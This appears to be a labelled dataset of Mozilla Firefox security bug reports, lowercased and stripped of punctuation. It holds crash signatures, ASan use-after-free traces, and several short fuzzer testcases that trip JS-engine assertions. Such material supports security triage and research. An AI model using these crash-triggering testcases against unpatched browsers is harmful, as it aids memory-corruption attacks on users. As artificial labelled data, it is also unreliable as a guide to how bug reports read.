crash in nscomptr_base assign_with_addref nswindowroot prehandleevent it s 10 browser crasher on mac os x in 22.0 signature nscomptr_base assign_with_addref nsisupports nswindowroot prehandleevent nseventchainprevisitor more reports search uuid b7fb3d22-1570-4eb8-8c15-e7d7a2130729 date processed 2013-07-29 04:07:12.795335 uptime 35480 install age 94426 since version was first installed install time 2013-07-28 01:53:08 product firefox version 23.0 build id 20130725195523 release channel beta os mac os x os version 10.8.4 12e55 build architecture amd64 build architecture info family 6 model 23 stepping 10 2 crash reason exc_bad_access kern_invalid_address crash address app notes adaptervendorid adapterdeviceid 0x 863gl layers gl context gl context gl layers frame module signature source 0 xul nscomptr_base assign_with_addref nsisupports obj-firefox/x86_64/xpcom/build/nscomptr.cpp 1 xul nswindowroot prehandleevent nseventchainprevisitor obj-firefox/x86_64/dist/include/nscomptr.h 2 xul nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray mozilla dom eventtarget content/events/src/nseventdispatcher.cpp 3 xul nseventdispatcher dispatchdomevent nsisupports nsevent nsidomevent nsprescontext nseventstatus content/events/src/nseventdispatcher.cpp 4 xul nsinode dispatchevent nsidomevent bool content/base/src/nsinode.cpp 5 xul nscontentutils dispatchevent nsidocument nsisupports nsastring_internal const bool bool bool bool content/base/src/nscontentutils.cpp 6 xul nscontentutils dispatchtrustedevent nsidocument nsisupports nsastring_internal const bool bool bool content/base/src/nscontentutils.cpp 7 xul nsglobalwindow fireofflinestatusevent dom/base/nsglobalwindow.cpp 8 xul nsglobalwindow observe nsisupports char const unsigned short const dom/base/nsglobalwindow.cpp 9 xul nsobserverlist notifyobservers nsisupports char const unsigned short const xpcom/ds/nsobserverlist.cpp 10 xul nsobserverservice notifyobservers nsisupports char const unsigned short const xpcom/ds/nsobserverservice.cpp 11 xul nsioservice setoffline bool netwerk/base/src/nsioservice.cpp 12 xul nsioservice observe nsisupports char const unsigned short const netwerk/base/src/nsioservice.cpp 13 xul zthn8_n11nsioservice7observeep11nsisupportspkcpkt netwerk/base/src/nsioservice.cpp 14 xul nsobserverlist notifyobservers nsisupports char const unsigned short const xpcom/ds/nsobserverlist.cpp 15 xul nsobserverservice notifyobservers nsisupports char const unsigned short const xpcom/ds/nsobserverservice.cpp 16 xul nsxredirprovider doshutdown toolkit/xre/nsxredirprovider.cpp 17 xul scopedxpcomstartup scopedxpcomstartup toolkit/xre/nsapprunner.cpp 18 xul xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp 19 xul xre_main toolkit/xre/nsapprunner.cpp 20 firefox main browser/app/nsbrowserapp.cpp 21 firefox start more reports at nswindowroot 3a 3aprehandleevent 28nseventchainprevisitor 26 29 nscomptr_base 3a 3aassign_with_addref 28nsisupports 29+|+nswindowroot 3a 3aprehandleevent 28nseventchainprevisitor 26 29	11
assertion failure obj is proxyobject at js/src/json.cpp:676 the following test case asserts with obj is proxyobject at js/src/json.cpp:676 json.parse a 0 b 1 function n v if n a object.defineproperty this b value new proxy c:0 return v	11
asan test test_multipart_streamconv_missing_lead_boundary.js triggers error this xpcshell test test_multipart_streamconv_missing_lead_boundary.js fails with addresssanitizer on mozilla-central revision 6e34995a746e the output of the command make solo_file test_multipart_streamconv_missing_lead_boundary.js c netwerk/test check-one 2 1 asan_symbolize.py c++filt is attached which includes the backtrace of the problem not sure which component this belongs to exactly please move as appropriate marking this s-s until triaged and confirmed to be safe	11
crash with ion settimeout array.prototype.filter testcase can cause assertion failure hasfp at js/src/vm/stack.h:1663 crash js ion fastinvoke security-sensitive because the testcase reminds me of bug 815010	11
assertion failure in nsunicharstreamloader writesegmentfun with iso-2022-jp 2 assertion failure bool builtin_expect ns_failed_impl rv 1 at netwerk/base/src/nsunicharstreamloader.cpp:218 same assertion as bug 843434 which josh fixed last week	11
medium exploitable crash indicshape with exception_stack_buffer_overrun winxp 1 on windows xp firefox 18 beta/20 aurora/21 nightly/22 crash opt indicshape hdc void unsigned short const int int tag_script_analysis unsigned short unsigned short tag_script_visattr int 0 usp10.dll indicshape 1 xul.dll gfxuniscribeshaper shapetext gfx/thebes/gfxuniscribeshaper.cpp:490 2 xul.dll gfxshapedtext setupclusterboundaries gfx/thebes/gfxfont.cpp:4557 3 mozalloc.dll moz_xrealloc memory/mozalloc/mozalloc.cpp:86 4 xul.dll gfxfontgroup initscriptrun wchar_t gfx/thebes/gfxfont.cpp:3951 5 xul.dll gfxscriptitemizer next gfx/thebes/gfxscriptitemizer.cpp:228 exploitability medium exception_stack_buffer_overrun bp-2008e109-b8ca-43d3-9acd-32b332130326 bp-905e95fe-e369-4cdf-89f7-4bc302130326 crash debug usp10.dll gfxuniscribeshaper shapetext nsautotarray gfxshapedtext detailedglyph int nsautotarray gfxshapedtext detailedglyph int gfxharfbuzzshaper setglyphsfromrun exploitability medium exception_stack_buffer_overrun	11
use-after-poison in nsframelist unhookframefromsiblings with moz-column debug assertion failure getproptableframes aprescontext aproperty at layout/generic/nscontainerframe.cpp:1459 asan use-after-poison of pres arena memory in nsframelist unhookframefromsiblings nightly no symptoms	11
clean up string api usages for dom/system/gonk no description provided	11
nsnativethemewin seems to spin event loop during layout this is what causes bug 748156 07:01:45 info assertion this is unsafe fix the caller error file e builds/moz2_slave/m-cen-w32-d-000000000000000000/build/content/events/src/nseventdispatcher.cpp line 494 07:01:45 info nseventdispatcher dispatchdomevent nsisupports nsevent nsidomevent nsprescontext nseventstatus content/events/src/nseventdispatcher.cpp:692 07:01:45 info nsglobalwindow dispatchevent nsidomevent bool dom/base/nsglobalwindow.cpp:7928 07:01:45 info nsglobalwindow dispatchevent nsidomevent bool dom/base/nsglobalwindow.cpp:7909 07:01:45 info nscontentutils dispatchevent nsidocument nsisupports nsastring_internal const bool bool bool bool content/base/src/nscontentutils.cpp:3532 07:01:45 info nscontentutils dispatchtrustedevent nsidocument nsisupports nsastring_internal const bool bool bool content/base/src/nscontentutils.cpp:3503 07:01:45 info nsfocusmanager windowlowered nsidomwindow dom/base/nsfocusmanager.cpp:766 07:01:45 info nswebshellwindow windowdeactivated xpfe/appshell/src/nswebshellwindow.cpp:418 07:01:45 info nswindow dispatchfocustotoplevelwindow bool widget/windows/nswindow.cpp:4080 07:01:45 info nswindow processmessage unsigned int unsigned int long long widget/windows/nswindow.cpp:5177 07:01:45 info nswindow windowprocinternal hwnd unsigned int unsigned int long widget/windows/nswindow.cpp:4390 07:01:45 info callwindowproccrashprotected xpcom/base/nscrashonexception.cpp:32 07:01:45 info nswindow windowproc hwnd unsigned int unsigned int long widget/windows/nswindow.cpp:4342 07:01:45 info user32 07:01:45 info user32 07:01:45 info user32 07:01:45 info user32 07:01:45 info ntdll 07:01:45 info user32 07:01:45 info user32 07:01:45 info user32 07:01:45 info user32 07:01:45 info ntdll 07:01:45 info queryforbuttondata widget/windows/nsnativethemewin.cpp:119 07:01:45 info nsiframe addcssminsize nsboxlayoutstate nsiframe nssize bool bool layout/xul/base/src/nsbox.cpp:690 07:01:45 info nsboxframe getminsize nsboxlayoutstate layout/xul/base/src/nsboxframe.cpp:816 07:01:45 info nsboxframe getprefsize nsboxlayoutstate layout/xul/base/src/nsboxframe.cpp:768 07:01:45 info nssprocketlayout getprefsize nsiframe nsboxlayoutstate layout/xul/base/src/nssprocketlayout.cpp:1320 07:01:45 info nsboxframe getprefsize nsboxlayoutstate layout/xul/base/src/nsboxframe.cpp:757 07:01:45 info nssprocketlayout getprefsize nsiframe nsboxlayoutstate layout/xul/base/src/nssprocketlayout.cpp:1320 07:01:45 info nsboxframe getprefsize nsboxlayoutstate layout/xul/base/src/nsboxframe.cpp:757 07:01:45 info nssprocketlayout getprefsize nsiframe nsboxlayoutstate layout/xul/base/src/nssprocketlayout.cpp:1320 07:01:45 info nsboxframe getprefsize nsboxlayoutstate layout/xul/base/src/nsboxframe.cpp:757 07:01:45 info nssprocketlayout populateboxsizes nsiframe nsboxlayoutstate nsboxsize int int int layout/xul/base/src/nssprocketlayout.cpp:738 07:01:45 info nssprocketlayout layout nsiframe nsboxlayoutstate layout/xul/base/src/nssprocketlayout.cpp:221 07:01:45 info nsboxframe dolayout nsboxlayoutstate layout/xul/base/src/nsboxframe.cpp:899 07:01:45 info nsiframe layout nsboxlayoutstate layout/xul/base/src/nsbox.cpp:512 07:01:45 info nsstacklayout layout nsiframe nsboxlayoutstate layout/xul/base/src/nsstacklayout.cpp:343 07:01:45 info nsboxframe dolayout nsboxlayoutstate layout/xul/base/src/nsboxframe.cpp:899 07:01:45 info nsiframe layout nsboxlayoutstate layout/xul/base/src/nsbox.cpp:512 07:01:45 info nsboxframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/xul/base/src/nsboxframe.cpp:703 07:01:45 info nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:971 07:01:45 info viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsviewportframe.cpp:226 07:01:45 info presshell processreflowcommands bool layout/base/nspresshell.cpp:7929 07:01:45 info presshell flushpendingnotifications mozilla changestoflush layout/base/nspresshell.cpp:3891 07:01:45 info nsrefreshdriver tick int64 mozilla timestamp layout/base/nsrefreshdriver.cpp:962 07:01:45 info mozilla refreshdrivertimer tickdriver nsrefreshdriver int64 mozilla timestamp layout/base/nsrefreshdriver.cpp:168 07:01:45 info mozilla refreshdrivertimer tick layout/base/nsrefreshdriver.cpp:159 07:01:45 info nstimerimpl fire xpcom/threads/nstimerimpl.cpp:547 07:01:45 info nstimerevent run xpcom/threads/nstimerimpl.cpp:636 07:01:45 info nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:627	11
crash in webrtc videocapturemodule getmaxofframearray this bug was filed from the socorro interface and is report bp-0a4f8b73-e624-48f2-bbf5-dc62d2130527 frame module signature source 0 xul.dll webrtc videocapturemodule getmaxofframearray media/webrtc/trunk/webrtc/modules/video_capture/windows/help_functions_ds.cc:26 1 xul.dll webrtc videocapturemodule deviceinfods createcapabilitymap media/webrtc/trunk/webrtc/modules/video_capture/windows/device_info_ds.cc:609 2 xul.dll webrtc videocapturemodule deviceinfoimpl numberofcapabilities media/webrtc/trunk/webrtc/modules/video_capture/device_info_impl.cc:76 3 xul.dll webrtc viecaptureimpl numberofcapabilities media/webrtc/trunk/webrtc/video_engine/vie_capture_impl.cc:442 4 xul.dll mozilla mediaenginewebrtcvideosource choosecapability content/media/webrtc/mediaenginewebrtcvideo.cpp:157 5 xul.dll mozilla mediaenginewebrtcvideosource allocate content/media/webrtc/mediaenginewebrtcvideo.cpp:224 6 xul.dll mozilla getusermediarunnable processgetusermedia dom/media/mediamanager.cpp:739 7 xul.dll mozilla getusermediarunnable run dom/media/mediamanager.cpp:600 8 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:627 9 xul.dll nsthread threadfunc xpcom/threads/nsthread.cpp:265 10 nss3.dll pr_nativerunthread nsprpub/pr/src/threads/combined/pruthr.c:395 11 nss3.dll pr_root nsprpub/pr/src/md/windows/w95thred.c:90 12 msvcr100.dll callthreadstartex f dd\vctools\crt_bld\self_x86\crt\src\threadex.c:314 13 msvcr100.dll threadstartex f dd\vctools\crt_bld\self_x86\crt\src\threadex.c:292 14 kernel32.dll basethreadinitthunk 15 ntdll.dll rtluserthreadstart 16 ntdll.dll rtluserthreadstart	11
conservative stack scanner does n't work when not in a request i ve been debugging bug 879649 for a good day and a half now and finally figured out what s going on in bug markconservativestackroots we bail out of stack scanning if cgcd hasstacktoscan 316 this predicate just evaluates to nativestacktop that is to say whether we have a usable pointer to the top of the stack this pointer is generated in recordnativestacktopforgc but is then cleared in updateforrequestend which gets called when our request count drops to zero 1230 and though recordnativestacktopforgc is called at the beginning of collect it no-ops because the request depth is zero 963 this means that anything on the stack outside of a request is n't rooted at all i would n't be surprised if there were dozens of such cases in the browser especially from consumers of nsiscriptcontext functions who do n't necessarily have a need to enter a request themselves marking sec-critical because the surface is wide enough that there s almost certainly an exploitable case somewhere	11
compartment mismatch with asm module in event listener attribute bp-3956aca3-ec88-4820-8830-a6f392130714	11
crash mozilla dom maybewrapobjectvalue with document.all after navigating away and gcing 1 set user_pref javascript.options.baselinejit.unsafe_eager_compilation true 2 install 3 load the testcase result crash mozilla dom maybewrapobjectvalue might be debug-only	11
assertion failure parent at jswrapper.cpp r function function f w 3 s function use asm return 1 for asserts js debug shell on m-c changeset 0d0263a58f06 without any cli arguments at assertion failure parent at jswrapper.cpp	11
ionmonkey fix arm movevalue so that gc pointers are traced i was reading some unrelated code earlier today and noticed this i m not sure it can cause crashes right now but there are some callers that pass a value that could be an object/string i think so let s assume it s possible x86/x64 already do this and grep shows this is the only place that uses payload.i32 without an ismarkable check	11
crash in mozilla dom nodebinding get_childnodes it s 48 browser crasher in 23.0b8 and 15 in the first day of 23.0b9 using mozregression the regression range is and the working range is it might be fixed by bug 884401 s patch signature mozilla dom nodebinding get_childnodes more reports search uuid e4aa87e5-24e7-4e0e-8da1-db5842130728 date processed 2013-07-28 08:05:27.125889 uptime 22 last crash 27 seconds before submission install age 51551 since version was first installed install time 2013-07-27 17:46:07 product firefox version 23.0 build id 20130725195523 release channel beta os windows nt os version 6.1.7601 service pack 1 build architecture x86 build architecture info genuineintel family 6 model 23 stepping 10 2 crash reason exception_access_violation_exec crash address app notes adaptervendorid adapterdeviceid adaptersubsysid 02051025 adapterdriverversion 8.15.10.2202 d2d d2d dwrite dwrite d3d10 layers d3d10 layers frame module signature source 0 1 xul.dll mozilla dom nodebinding get_childnodes obj-firefox/dom/bindings/nodebinding.cpp 2 mozjs.dll tolowercasehelper js/src/jsstr.cpp 3 4 more reports at	11
crash with sigtrap with parallelarray and ion-check-range-analysis the following testcase crashes on mozilla-central revision 4887845b1142 threadsafe build run with fuzzing-safe ion-check-range-analysis assertarrayseqparresultseq range 0 1024 filter function e i return i 1.1 0 function range n m var result for var i n i m i result.push i return result function assertarrayseqparresultseq arr op func arr op apply arr func	11
asan use-after-free in js_getglobalforscopechain the attached testcase crashes firefox nightly with the following asan output needs domfuzzlite and might need several reloads sometimes helps to open in multiple tabs at the same time 7138 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in js_getglobalforscopechain jscontext builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:2267:0 1 in xpc_unmarkgraycontext jscontext builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/xpcpublic.h:200:0 2 in nscxpusher dopush jscontext builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/nscxpusher.cpp:138:0 3 in nsglobalwindow freeinnerobjects builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsglobalwindow.cpp:1462:0 4 in nsglobalwindow detachfromdocshell builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsglobalwindow.cpp:2733:0 5 in nsdocshell destroy builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsdocshell.cpp:4960:0 6 in non-virtual thunk to nsdocshell destroy builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsdocshell.cpp:4993:0 7 in nsframeloader finalize builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsframeloader.cpp:574:0 8 in nsdocument maybeinitializefinalizeframeloaders builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsdocument.cpp:6267:0 9 in nsrunnablemethodimpl void nsdocument true run builds/slave/m-cen-l64-dbg-asan-ntly-000000/build dist/include/nsthreadutils.h:350:0 10 in nscontentutils addscriptrunner nsirunnable builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nscontentutils.cpp:4831:0 11 in nsdocument finalizeframeloader nsframeloader builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsdocument.cpp:6223:0 12 in nsframeloader destroy builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsframeloader.cpp:1365:0 13 in nsgenerichtmlframeelement destroycontent builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/content/src/nsgenerichtmlframeelement.cpp:274:0 14 in mozilla dom fragmentorelement destroycontent builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/fragmentorelement.cpp:950:0 15 in nsdocument destroy builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsdocument.cpp:7736:0 16 in nsdocumentviewer destroy builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsdocumentviewer.cpp:1618:0 17 in nsdocumentviewer show builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsdocumentviewer.cpp:1921:0 18 in nsprescontext ensurevisible builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsprescontext.cpp:1856:0 19 in presshell unsuppressandinvalidate builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nspresshell.cpp:3562:0 20 in nsdocumentviewer loadcomplete tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsdocumentviewer.cpp:1065:0 21 in nsdocshell endpageload nsiwebprogress nsichannel tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsdocshell.cpp:6657:0 22 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsdocshell.cpp:6454:0 23 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsdocshell.cpp:6461:0 24 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsdocloader.cpp:1323:0 25 in nsdocloader dostopdocumentload nsirequest tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsdocloader.cpp:865:0 26 in nsdocloader docloaderisempty bool builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsdocloader.cpp:755:0 27 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsdocloader.cpp:639:0 28 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsdocloader.cpp:643:0 29 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/netwerk/base/src/nsloadgroup.cpp:684:0 30 in nsdocument dounblockonload builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsdocument.cpp:7953:0 31 in nsdocument unblockonload bool builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsdocument.cpp:7881:0 32 in nsdocument dispatchcontentloadedevents builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsdocument.cpp:4625:0 33 in nsrunnablemethodimpl void nsdocument true run builds/slave/m-cen-l64-dbg-asan-ntly-000000/build dist/include/nsthreadutils.h:350:0 34 in nsthread processnextevent bool bool builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/threads/nsthread.cpp:626:0 35 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/xpcom/build/nsthreadutils.cpp:238:0 36 in mozilla ipc messagepump run base messagepump delegate builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/glue/messagepump.cpp:82:0 37 in messageloop runinternal builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:219:0 38 in messageloop run builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:186:0 39 in nsbaseappshell run builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/widget/xpwidgets/nsbaseappshell.cpp:163:0 40 in nsappstartup run builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/components/startup/nsappstartup.cpp:269:0 41 in xremain xre_mainrun builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsapprunner.cpp:3851:0 42 in xremain xre_main int char nsxreappdata const builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsapprunner.cpp:3919:0 43 in xre_main builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsapprunner.cpp:4121:0 44 in do_main int char nsifile builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsbrowserapp.cpp:272:0 45 in main builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsbrowserapp.cpp:632:0 46 in 0 is located 32 bytes inside of 1112-byte region freed by thread t0 here 0 in interceptor_free 1 in sweepcompartments js freeop js zone bool bool builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:2524:0 2 in sweepzones js freeop bool builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:2558:0 3 in endsweepphase jsruntime js jsgcinvocationkind bool builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:3906:0 4 in incrementalcollectslice jsruntime long js gcreason reason js jsgcinvocationkind builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4308:0 5 in gccycle jsruntime bool long js jsgcinvocationkind js gcreason reason builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4422:0 6 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4581:0 7 in nsxpccomponents_utils forcegc builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/xpccomponents.cpp:4012:0 8 in ns_invokebyindex builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162:0 9 in callmethodhelper call builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/xpcwrappednative.cpp:2267:0 10 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/xpcwrappednative.cpp:2233:0 11 in xpc_wn_callmethod jscontext unsigned int js value builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/xpcwrappednativejsops.cpp:1480:0 12 in js calljsnative jscontext int jscontext unsigned int js value js callargs const builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 13 in js invoke jscontext js callargs js maybeconstruct builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/interpreter.cpp:381:0 14 in previously allocated by thread t0 here 0 in malloc 1 in js mallocprovider jscontext malloc unsigned long builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxt.h:558:0 2 in jscompartment js mallocprovider jscontext new jscompartment js zone js zone builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxt.h:623:0 3 in js newcompartment jscontext js zone jsprincipals builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsgc.cpp:4724:0 4 in js_newglobalobject jscontext jsclass jsprincipals unsigned long builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:3446:0 5 in xpc createglobalobject jscontext jsclass nsiprincipal unsigned long builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/nsxpconnect.cpp:994:0 6 in xpcwrappednative wrapnewglobal xpcobjecthelper nsiprincipal bool unsigned long xpcwrappednative builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/xpcwrappednative.cpp:318:0 7 in nsxpconnect initclasseswithnewwrappedglobal jscontext nsisupports nsiprincipal unsigned int unsigned long nsixpconnectjsobjectholder builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/nsxpconnect.cpp:1050:0 8 in createnativeglobalforinner jscontext nsglobalwindow nsiuri nsiprincipal jsobject nsixpconnectjsobjectholder builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsglobalwindow.cpp:2142:0 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 442m malloced 440m for red zones by 993366 calls stats 41m realloced by 42405 calls stats 412m freed by 851905 calls stats 376m really freed by 790743 calls stats 270m 69346 full pages mmaped in 483 calls mmaps by size class 7:159705 8:57316 9:17391 10:8176 11:7395 12:1792 13:1856 14:512 15:256 16:656 17:456 18:26 19:36 20:23 21:11 mallocs by size class 7:688188 8:180185 9:48390 10:33029 11:23787 12:5112 13:6965 14:2704 15:980 16:1981 17:1831 18:86 19:53 20:46 21:29 frees by size class 7:599202 8:143470 9:39569 10:29869 11:21822 12:4171 13:6532 14:2509 15:864 16:1880 17:1815 18:81 19:49 20:44 21:28 rfrees by size class 7:566830 8:128961 9:33347 10:26920 11:18811 12:3575 13:5684 14:2229 15:794 16:1768 17:1632 18:78 19:45 20:41 21:28 stats malloc large 5006 small slow 11181	11
gc hazard with default compartments and frame chain restoration default compartments make our book keeping tricky in a number of ways when we re in the default compartment entercompartmentdepth is zero but cx compartment is non-null the default compartment on a cx can change at any time even when we ve already got code running on that cx the default compartment is actually tracked by a default compartment object which is the outer window in gecko but this object gets transplanted so even if it stays the same the compartment we compute from it varies with time meanwhile saveframechain slurps up the current compartment and entercompartmentdepth of a cx and pushes it onto a stack putting the cx in whatever compartment currently holds the associated default compartment object restoreframechain pops the stack and resets the previous compartment and entercompartmentdepth this whole setup significantly complicates our attempt to mark all the live globals in the system currently we do three things a in the js engine mark the global associated with each frame on the stack b in the js engine iterate over all the compartments and mark those we ve called enter on c in xpconnect iterate over all the contexts and mark the global associated with the default compartment object this usually works but it breaks in the following case 1 cx entercompartmentdepth is zero and cx is in the default compartment there is no code running on cx 2 we push cx causing us to call saveframechain stashing the tuple 0 defaultcompartmentobject compartment onto the savedframechain stack 3 we either call js_setglobalobject cx someotherobject or transplant defaultcompartmentobject to another compartment 4 we pop cx causing us to call restoreframechain setting cx entercompartmentdepth to 0 and putting cx in the old compartment which is no longer equal to cx defaultcompartmentobject compartment after 3 nothing is keeping the saved compartment alive see a-c above a no code was running in 1 we do n't have any stack frames to trace b we never call enter on default compartments c the compartment does n't match that of the defaultcompartmentobject on the cx so the xpconnect hook misses it we can keep the compartment alive between 3 and 4 by calling enter on all the compartments we push onto the savedframechain stack luke suggested this on monday but once 4 happens we d have to call leave and still be screwed i then thought that we could check in saveframechain whether we either a have manually entered the current compartment or b have a non-empty scope-chain in the current compartment if we have neither of the above we d set the compartment of the savedframechain to null and compute the default compartment when it comes time to actually use it but if b is the case then we re still in trouble because as soon as the associated code is finished running the cx will remain in that compartment but we ll have no way to mark it since none of a-c will apply once the last stack frame is popped in general the solution here is to rip out default compartment objects and i have a plan to do that but i d like to find a well-contained fix here that we can backport thoughts luke	11
assertion must have the same owner document with editor sel.selectallchildren assertion must have the same owner document hassameownerdoc node_from aparent adocument file content/base/src/element.cpp line 1028 assertion adocument must be current doc of aparent aparent adocument aparent getcurrentdoc file content/base/src/element.cpp line 1030 assertion unexpected adocument adocument mdocument file layout/base/nspresshell.cpp line 4025 assertion must be in the same rule tree as parent r1 r2 file layout/style/nsstylecontext.cpp line 67 security-sensitive in case this is related to bug 840098	11
canvas2d crash mozilla gfx drawtargetcg strokerect if isgradient apattern there s no cgcontextclipstrokerect so we do it by hand cgcontextbeginpath cg cgcontextaddrect cg recttocgrect arect cgcontextreplacepathwithstrokedpath cg xxx should we use eo clip here cgcontextclip cg drawgradient cg apattern else setstrokefrompattern cg mcolorspace apattern cgcontextstrokerect cg recttocgrect arect tested with	11
assertion failure barrier verifier unmarked edge method at gc/verifier.cpp:572 with setobjectmetadatacallback the following testcase asserts on mozilla-central revision bc569033125a no options required evaluate for var time 0 year 1969 year 0 year time timeinyear year function timeinyear y gczeal 4 noscriptrval true evaluate setobjectmetadatacallback noscriptrval true	11
data race in paris bindings due to use of xpc stringtojsval xpc stringtojsval uses some static variables when used from multiple threads this causes problems here s the stack xul.dll stringbuffertojsval xpcpublic.h:214 xul.dll readabletojsval xpcstring.cpp:71 xul.dll nonvoidstringtojsval xpcquickstubs.cpp:791 xul.dll nonvoidstringtojsval xpcpublic.h:291 xul.dll get_responsetext xmlhttprequestbinding.cpp:2492 xul.dll genericgetter xmlhttprequestbinding.cpp:2769 mozjs.dll calljsnative jscntxtinlines.h:218 mozjs.dll invoke interpreter.cpp:489 mozjs.dll invoke interpreter.cpp:539 mozjs.dll invokegetterorsetter interpreter.cpp:610 mozjs.dll get shape-inl.h:256 mozjs.dll nativegetinline 1 jsobj.cpp:4029 mozjs.dll getpropertyhelperinline 1 jsobj.cpp:4200 mozjs.dll getpropertyhelper jsobj.cpp:4209 mozjs.dll getpropertyoperation interpreter.cpp:292 mozjs.dll interpret interpreter.cpp:2323 mozjs.dll runscript interpreter.cpp:446 mozjs.dll executekernel interpreter.cpp:630 mozjs.dll execute interpreter.cpp:667 mozjs.dll evaluate jsapi.cpp:5156 xul.dll workerrun scriptloader.cpp:660 xul.dll run 